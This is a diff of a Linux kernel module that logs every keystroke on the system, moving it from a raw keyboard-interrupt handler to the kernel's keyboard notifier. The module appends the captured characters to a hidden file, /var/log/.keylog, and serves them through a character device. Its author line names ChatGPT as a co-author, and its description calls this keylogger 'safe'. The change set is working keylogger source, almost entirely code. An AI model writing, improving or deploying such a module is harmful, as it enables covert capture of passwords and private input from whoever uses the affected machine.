@@ -12,16 +12,12 @@
 #include <linux/cred.h>
 #include <linux/slab.h>
 #include <linux/file.h>
-#include <linux/interrupt.h>
-#include <asm/io.h>
+#include <linux/keyboard.h>
+#include <linux/input.h>
 
 #define DEVICE_NAME "keylogger"
 #define BUF_SIZE 1024
 #define LOG_PATH "/var/log/.keylog"
-
-#define I8042_KBD_IRQ 1
-#define I8042_DATA_REG 0x60
-#define SCANCODE_RELEASED_MASK 0x80
 
 static dev_t dev_num;
 static struct cdev keylogger_cdev;
@@ -34,113 +30,44 @@ static DECLARE_WAIT_QUEUE_HEAD(keylogger_wq);
 
 static struct work_struct keylogger_work;
 static char pending_key;
-
 static struct file *log_file;
 
-// Trạng thái phím
-static bool left_shift_pressed = false;
-static bool right_shift_pressed = false;
-static bool left_ctrl_pressed = false;
-static bool right_ctrl_pressed = false;
+static bool shift_pressed = false;
 static bool caps_lock_active = false;
 
-// Bảng ánh xạ scancode sang ký tự (QWERTY)
 struct key_map {
-    unsigned char scancode;
+    int keycode;
     char normal;
     char shifted;
 };
 
 static const struct key_map keymap[] = {
-    {0x02, '1', '!'},
-    {0x03, '2', '@'},
-    {0x04, '3', '#'},
-    {0x05, '4', '$'},
-    {0x06, '5', '%'},
-    {0x07, '6', '^'},
-    {0x08, '7', '&'},
-    {0x09, '8', '*'},
-    {0x0a, '9', '('},
-    {0x0b, '0', ')'},
-    {0x0c, '-', '_'},
-    {0x0d, '=', '+'},
-    {0x0f, '\t', '\t'}, // Tab
-    {0x10, 'q', 'Q'},
-    {0x11, 'w', 'W'},
-    {0x12, 'e', 'E'},
-    {0x13, 'r', 'R'},
-    {0x14, 't', 'T'},
-    {0x15, 'y', 'Y'},
-    {0x16, 'u', 'U'},
-    {0x17, 'i', 'I'},
-    {0x18, 'o', 'O'},
-    {0x19, 'p', 'P'},
-    {0x1a, '[', '{'}, // [
-    {0x1b, ']', '}'}, // ]
-    {0x1c, '\n', '\n'}, // Enter
-    {0x1e, 'a', 'A'},
-    {0x1f, 's', 'S'},
-    {0x20, 'd', 'D'},
-    {0x21, 'f', 'F'},
-    {0x22, 'g', 'G'},
-    {0x23,'h', 'H'},
-    {0x24, 'j', 'J'},
-    {0x25, 'k', 'K'},
-    {0x26, 'l', 'L'},
-    {0x27, ';', ':'}, // ;
-    {0x28, '\'', '"'}, // '
-    {0x2b, '\\', '|'}, // 
-    {0x2c, 'z', 'Z'},
-    {0x2d, 'x', 'X'},
-    {0x2e, 'c', 'C'},
-    {0x2f, 'v', 'V'},
-    {0x30, 'b', 'B'},
-    {0x31, 'n', 'N'},
-    {0x32, 'm', 'M'},
-    {0x33, ',', '<'}, // ,
-    {0x34, '.', '>'}, // .
-    {0x35, '/', '?'}, // /
-    {0x39, ' ', ' '}, // Space
-    // Phím điều khiển
-    {0x2a, 0, 0}, // Left Shift
-    {0x36, 0, 0}, // Right Shift
-    {0x3a, 0, 0}, // Caps Lock
-    {0x1d, 0, 0}, // Left Ctrl
-    {0xe01d, 0, 0}, // Right Ctrl
-    {0, 0, 0} // Kết thúc bảng
+    {KEY_1, '1', '!'}, {KEY_2, '2', '@'}, {KEY_3, '3', '#'}, {KEY_4, '4', '$'},
+    {KEY_5, '5', '%'}, {KEY_6, '6', '^'}, {KEY_7, '7', '&'}, {KEY_8, '8', '*'},
+    {KEY_9, '9', '('}, {KEY_0, '0', ')'}, {KEY_MINUS, '-', '_'}, {KEY_EQUAL, '=', '+'},
+    {KEY_TAB, '\t', '\t'}, {KEY_Q, 'q', 'Q'}, {KEY_W, 'w', 'W'}, {KEY_E, 'e', 'E'},
+    {KEY_R, 'r', 'R'}, {KEY_T, 't', 'T'}, {KEY_Y, 'y', 'Y'}, {KEY_U, 'u', 'U'},
+    {KEY_I, 'i', 'I'}, {KEY_O, 'o', 'O'}, {KEY_P, 'p', 'P'}, {KEY_LEFTBRACE, '[', '{'},
+    {KEY_RIGHTBRACE, ']', '}'}, {KEY_ENTER, '\n', '\n'}, {KEY_A, 'a', 'A'}, {KEY_S, 's', 'S'},
+    {KEY_D, 'd', 'D'}, {KEY_F, 'f', 'F'}, {KEY_G, 'g', 'G'}, {KEY_H, 'h', 'H'},
+    {KEY_J, 'j', 'J'}, {KEY_K, 'k', 'K'}, {KEY_L, 'l', 'L'}, {KEY_SEMICOLON, ';', ':'},
+    {KEY_APOSTROPHE, '\'', '"'}, {KEY_BACKSLASH, '\\', '|'}, {KEY_Z, 'z', 'Z'},
+    {KEY_X, 'x', 'X'}, {KEY_C, 'c', 'C'}, {KEY_V, 'v', 'V'}, {KEY_B, 'b', 'B'},
+    {KEY_N, 'n', 'N'}, {KEY_M, 'm', 'M'}, {KEY_COMMA, ',', '<'}, {KEY_DOT, '.', '>'},
+    {KEY_SLASH, '/', '?'}, {KEY_SPACE, ' ', ' '},
+    {0, 0, 0}
 };
 
-static char scancode_to_char(unsigned char scancode) {
-    bool shift_active = left_shift_pressed || right_shift_pressed;
+static char keycode_to_char(int keycode) {
+    bool is_letter = (keycode >= KEY_A && keycode <= KEY_Z);
+    bool use_shifted = shift_pressed ^ (is_letter && caps_lock_active);
 
-    for (int i = 0; keymap[i].scancode; i++) {
-        if (keymap[i].scancode == scancode) {
-            if (scancode == 0x2a) { // Left Shift
-                return 0;
-            }
-            if (scancode == 0x36) { // Right Shift
-                return 0;
-            }
-            if (scancode == 0x3a) { // Caps Lock
-                return 0;
-            }
-            if (scancode == 0x1d) { // Left Ctrl
-                return 0;
-            }
-            if (scancode == 0xe01d) { // Right Ctrl
-                return 0;
-            }
-            if (keymap[i].normal == 0) return 0;
-
-            // Kiểm tra xem phím có phải là chữ cái (a-z)
-            bool is_letter = (keymap[i].normal >= 'a' && keymap[i].normal <= 'z');
-            // Áp dụng Caps Lock chỉ cho chữ cái
-            bool use_shifted = shift_active || (is_letter && caps_lock_active);
-
+    for (int i = 0; keymap[i].keycode; i++) {
+        if (keymap[i].keycode == keycode) {
             return use_shifted ? keymap[i].shifted : keymap[i].normal;
         }
     }
-    return '?';
+    return 0;
 }
 
 static void keylogger_work_func(struct work_struct *work) {
@@ -160,54 +87,44 @@ static void keylogger_work_func(struct work_struct *work) {
 
     if (log_file) {
         loff_t pos = 0;
-        kernel_write(log_file, &c, 1, &pos);
+        printk(KERN_DEBUG "Writing to log: %c\n", c); // Debug log
+        ssize_t written = kernel_write(log_file, &c, 1, &pos);
+        if (written < 0) {
+            printk(KERN_ERR "Failed to write to log file: %ld\n", written);
+        }
     }
 }
 
-static irqreturn_t irq_handler(int irq, void *dev_id) {
-    unsigned long flags;
-    unsigned char scancode = inb(I8042_DATA_REG);
-    unsigned char keycode = scancode & ~SCANCODE_RELEASED_MASK;
-    bool is_pressed = !(scancode & SCANCODE_RELEASED_MASK);
+static int keylogger_notifier(struct notifier_block *nb, unsigned long action, void *data) {
+    struct keyboard_notifier_param *param = data;
 
-    // Xử lý phím Shift
-    if (keycode == 0x2a) { // Left Shift
-        left_shift_pressed = is_pressed;
-        return IRQ_HANDLED;
-    }
-    if (keycode == 0x36) { // Right Shift
-        right_shift_pressed = is_pressed;
-        return IRQ_HANDLED;
-    }
+    printk(KERN_DEBUG "Notifier action: %lu, value: %d, down: %d\n", action, param->value, param->down); // Debug log
 
-    // Xử lý phím Ctrl
-    if (keycode == 0x1d) { // Left Ctrl
-        left_ctrl_pressed = is_pressed;
-        return IRQ_HANDLED;
-    }
-    if (keycode == 0xe01d) { // Right Ctrl
-        right_ctrl_pressed = is_pressed;
-        return IRQ_HANDLED;
-    }
-
-    // Xử lý Caps Lock
-    if (keycode == 0x3a && is_pressed) {
-        caps_lock_active = !caps_lock_active;
-        return IRQ_HANDLED;
-    }
-
-    // Xử lý phím thông thường (chỉ khi nhấn)
-    if (is_pressed) {
-        spin_lock_irqsave(&buf_lock, flags);
-        pending_key = scancode_to_char(keycode);
-        spin_unlock_irqrestore(&buf_lock, flags);
-        if (pending_key) {
-            schedule_work(&keylogger_work);
+    // Xử lý KBD_KEYCODE thay vì KBD_KEYSYM
+    if (action == KBD_KEYCODE) {
+        if (param->value == KEY_LEFTSHIFT || param->value == KEY_RIGHTSHIFT) {
+            shift_pressed = param->down;
+            return NOTIFY_OK;
+        }
+        if (param->value == KEY_CAPSLOCK && param->down) {
+            caps_lock_active = !caps_lock_active;
+            return NOTIFY_OK;
+        }
+        if (param->down) {
+            char c = keycode_to_char(param->value);
+            if (c) {
+                pending_key = c;
+                schedule_work(&keylogger_work);
+            }
         }
     }
 
-    return IRQ_HANDLED;
+    return NOTIFY_OK;
 }
+
+static struct notifier_block nb = {
+    .notifier_call = keylogger_notifier
+};
 
 static ssize_t keylogger_read(struct file *file, char __user *buf, size_t len, loff_t *off) {
     int copied = 0;
@@ -240,60 +157,69 @@ static int __init keylogger_init(void) {
 
     log_file = filp_open(LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
     if (IS_ERR(log_file)) {
-        printk(KERN_ERR "Failed to open keylog file\n");
+        printk(KERN_ERR "Failed to open log file: %ld\n", PTR_ERR(log_file));
         log_file = NULL;
+    } else if (log_file == NULL) {
+        printk(KERN_ERR "Log file pointer is NULL\n");
+    } else {
+        printk(KERN_INFO "Log file opened successfully\n");
     }
 
     INIT_WORK(&keylogger_work, keylogger_work_func);
     spin_lock_init(&buf_lock);
 
     ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
-    if (ret < 0) return ret;
+    if (ret < 0) {
+        printk(KERN_ERR "Failed to allocate character device region: %d\n", ret);
+        return ret;
+    }
 
     cdev_init(&keylogger_cdev, &fops);
     ret = cdev_add(&keylogger_cdev, dev_num, 1);
-    if (ret < 0) goto unregister_dev;
+    if (ret < 0) {
+        printk(KERN_ERR "Failed to add character device: %d\n", ret);
+        goto unregister;
+    }
 
     keylogger_class = class_create(DEVICE_NAME);
     if (IS_ERR(keylogger_class)) {
         ret = PTR_ERR(keylogger_class);
+        printk(KERN_ERR "Failed to create device class: %d\n", ret);
         goto del_cdev;
     }
 
-    if (!device_create(keylogger_class, NULL, dev_num, NULL, DEVICE_NAME)) {
-        ret = -EINVAL;
-        goto destroy_class;
+    device_create(keylogger_class, NULL, dev_num, NULL, DEVICE_NAME);
+
+    ret = register_keyboard_notifier(&nb);
+    if (ret < 0) {
+        printk(KERN_ERR "Failed to register keyboard notifier: %d\n", ret);
+        goto destroy_device;
     }
 
-    ret = request_irq(I8042_KBD_IRQ, irq_handler, IRQF_SHARED, DEVICE_NAME, (void *)irq_handler);
-    if (ret) {
-        printk(KERN_ERR "Failed to request IRQ\n");
-        goto destroy_class;
-    }
-
-    printk(KERN_INFO "Keylogger loaded (IRQ based).\n");
+    printk(KERN_INFO "Keylogger loaded (keyboard_notifier).\n");
     return 0;
 
-destroy_class:
+destroy_device:
+    device_destroy(keylogger_class, dev_num);
     class_destroy(keylogger_class);
 del_cdev:
     cdev_del(&keylogger_cdev);
-unregister_dev:
+unregister:
     unregister_chrdev_region(dev_num, 1);
     return ret;
 }
 
 static void __exit keylogger_exit(void) {
-    free_irq(I8042_KBD_IRQ, (void *)irq_handler);
+    unregister_keyboard_notifier(&nb);
     flush_work(&keylogger_work);
     device_destroy(keylogger_class, dev_num);
     class_destroy(keylogger_class);
     cdev_del(&keylogger_cdev);
     unregister_chrdev_region(dev_num, 1);
-
-    if (log_file)
+    if (log_file) {
         filp_close(log_file, NULL);
-
+        printk(KERN_INFO "Log file closed.\n");
+    }
     printk(KERN_INFO "Keylogger unloaded.\n");
 }
 
@@ -301,5 +227,5 @@ module_init(keylogger_init);
 module_exit(keylogger_exit);
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("ChatGPT + duckanh");
-MODULE_DESCRIPTION("IRQ-based system-wide keylogger with char device + log file"); 
+MODULE_AUTHOR("duckanh + ChatGPT");
+MODULE_DESCRIPTION("Safe keylogger using keyboard_notifier + char device + log file");
